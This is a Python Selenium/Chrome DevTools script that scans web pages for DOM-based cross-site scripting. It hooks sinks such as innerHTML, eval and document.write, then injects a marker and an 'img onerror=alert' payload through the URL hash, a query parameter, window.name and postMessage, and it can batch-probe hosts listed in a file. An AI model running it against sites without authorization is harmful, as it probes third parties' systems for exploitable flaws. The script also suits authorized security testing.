#!/usr/bin/env python3
"""Runtime DOM-XSS taint scanner (Selenium + CDP).
For each URL: inject a unique marker via location.hash, ?param, window.name, and a
postMessage, with sink hooks installed BEFORE document scripts run. Reports any sink
that receives the marker (innerHTML/outerHTML/document.write/insertAdjacentHTML/eval/
Function/setAttribute/location.*) and whether alert/prompt/confirm fired.

Usage: dom_xss_taint.py <url1> [url2 ...]
       dom_xss_taint.py --file hosts.txt   (probes https://host/ for each)
"""
import sys, time, json
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

MARK = "zqTAINT9"
HOOK = r"""
(function(){
  window.__sink=[]; window.__exec=null; var M="%s";
  function log(t,v){ try{ v=''+v; }catch(e){ v='<?>'; }
    if(v.indexOf(M)>=0) window.__sink.push(t+' <- '+v.slice(0,120)); }
  ['alert','prompt','confirm'].forEach(function(f){var o=window[f];
    window[f]=function(x){window.__exec=f+':'+x; window.__sink.push('EXEC '+f+':'+x); return o&&o.call(window,x);};});
  function hookSetter(proto,prop,tag){ try{
    var d=Object.getOwnPropertyDescriptor(proto,prop); if(!d||!d.set)return;
    Object.defineProperty(proto,prop,{configurable:true,get:d.get,
      set:function(v){ log(tag,v); return d.set.call(this,v); }});
  }catch(e){} }
  hookSetter(Element.prototype,'innerHTML','innerHTML');
  hookSetter(Element.prototype,'outerHTML','outerHTML');
  if(window.HTMLElement) hookSetter(HTMLElement.prototype,'innerHTML','innerHTML');
  var dw=document.write; document.write=function(s){log('document.write',s); return dw.apply(document,arguments);};
  var iah=Element.prototype.insertAdjacentHTML;
  Element.prototype.insertAdjacentHTML=function(p,s){log('insertAdjacentHTML',s); return iah.apply(this,arguments);};
  var sa=Element.prototype.setAttribute;
  Element.prototype.setAttribute=function(n,v){ if(/^(href|src|on|action|formaction)/i.test(n)) log('setAttribute['+n+']',v); return sa.apply(this,arguments);};
  var oe=window.eval; window.eval=function(s){log('eval',s); return oe(s);};
  var OF=window.Function; // note: cannot easily wrap Function constructor calls safely
  ['assign','replace'].forEach(function(m){ var o=window.location[m]&&window.location[m].bind(window.location);
    try{ window.location[m]=function(u){log('location.'+m,u); return o&&o(u);}; }catch(e){} });
  // expose marker for context
  window.__M=M;
})();
""" % MARK

def drv():
    o = Options()
    for a in ["--headless=new","--no-sandbox","--disable-gpu","--disable-dev-shm-usage","--window-size=1280,1024"]:
        o.add_argument(a)
    o.binary_location = "/usr/bin/google-chrome"
    return webdriver.Chrome(options=o)

def test_url(url):
    pu = urlparse(url)
    origin = pu.scheme + "://" + pu.netloc
    # build 4 taint variants
    payload = MARK + "<img src=x onerror=alert(document.domain)>"
    variants = [
        ("hash",   url + "#" + payload),
        ("search", url + ("&" if "?" in url else "?") + "tq=" + payload),
        ("name",   url),   # window.name set separately
    ]
    out = {"url": url, "results": []}
    for label, nav in variants:
        d = drv()
        try:
            d.get(origin + "/")
            d.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": HOOK})
            if label == "name":
                d.execute_script("window.name = arguments[0];", payload)
            d.get(nav)
            time.sleep(4)
            # also fire a postMessage of the marker
            try:
                d.execute_script("window.postMessage(arguments[0], '*');", payload)
                time.sleep(1)
            except Exception:
                pass
            try:
                al = d.switch_to.alert; t = al.text; al.accept();
                out["results"].append({"variant": label, "EXEC_DIALOG": t})
            except Exception:
                pass
            sinks = d.execute_script("return window.__sink || [];")
            exe = d.execute_script("return window.__exec;")
            if sinks or exe:
                out["results"].append({"variant": label, "exec": exe, "sinks": sinks[:6]})
        except Exception as e:
            out["results"].append({"variant": label, "err": str(e)[:80]})
        finally:
            d.quit()
    return out

def main():
    if len(sys.argv) < 2:
        print("usage: dom_xss_taint.py <url...> | --file hosts.txt"); return
    if sys.argv[1] == "--file":
        urls = ["https://" + l.strip().split("|")[0] + "/" for l in open(sys.argv[2])
                if l.strip() and not l.startswith("#") and "*" not in l]
    else:
        urls = sys.argv[1:]
    for u in urls:
        try:
            r = test_url(u)
            if r["results"]:
                print(json.dumps(r, ensure_ascii=False))
            else:
                print(json.dumps({"url": u, "clean": True}))
        except Exception as e:
            print(json.dumps({"url": u, "fatal": str(e)[:100]}))

if __name__ == "__main__":
    main()
